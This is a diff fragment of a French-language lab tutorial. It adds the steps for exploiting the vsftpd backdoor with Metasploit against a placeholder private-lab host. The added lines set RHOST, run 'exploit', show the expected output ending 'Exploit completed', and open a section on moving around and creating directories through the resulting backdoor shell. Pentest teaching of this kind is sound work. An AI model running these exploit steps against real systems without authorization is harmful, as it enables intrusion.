@@ -96,5 +96,22 @@ On va utiliser cette vulnérabilité
 
 msf6 exploit(unix/ftp/vsft...backdoor) >
 
+set RHOST 192.168.56.XX
+
+exploit
+
+réponse attendue:
+>
+> [*] 192.168.56.XX:21 - Banners: 220 ......
+>
+>.....
+>
+> [*]  Exploit completed
+
+------
+
+## Test la backdoor
+
+on peux se déplacer , créer un répertoire , ....
 
 
